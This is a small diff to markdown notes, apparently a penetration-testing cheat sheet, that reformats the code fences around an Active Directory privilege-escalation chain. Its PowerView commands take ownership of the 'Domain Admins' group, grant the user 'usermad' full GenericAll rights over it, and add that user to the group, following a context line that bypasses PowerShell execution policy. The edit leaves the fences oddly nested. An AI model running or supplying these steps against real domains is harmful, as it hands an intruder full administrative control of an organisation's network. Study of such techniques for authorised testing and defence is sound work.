@@ -107,12 +107,14 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 ```
 ```bash
 - 1. Take ownership
-
+```powershell
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
-
+```
 - 2. Grant yourself GenericAll
+```powershell
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
-
+```
+```powershell
 - 3. Add to group
 Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose
 ```
